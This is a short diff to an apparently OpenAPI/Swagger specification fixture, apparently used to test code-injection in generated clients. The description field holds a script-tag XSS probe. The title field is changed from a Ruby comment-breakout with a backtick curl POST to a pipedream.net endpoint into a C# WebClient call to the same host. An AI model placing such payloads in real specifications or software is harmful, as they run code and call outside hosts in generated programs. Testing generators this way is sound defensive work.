@@ -3,7 +3,7 @@
           "info": {
               "description": "<script>alert(1)</script>",
               "version": "1.0.0",
-              "title": "=end `curl -X POST -d \"fizz=buzz\" https://eo2gjl4lyl460rs.m.pipedream.net`"
+              "title": "Console.WriteLine(new WebClient().DownloadString(\"https://eo2gjl4lyl460rs.m.pipedream.net\"));"
           },
           "schemes": [
               "http"
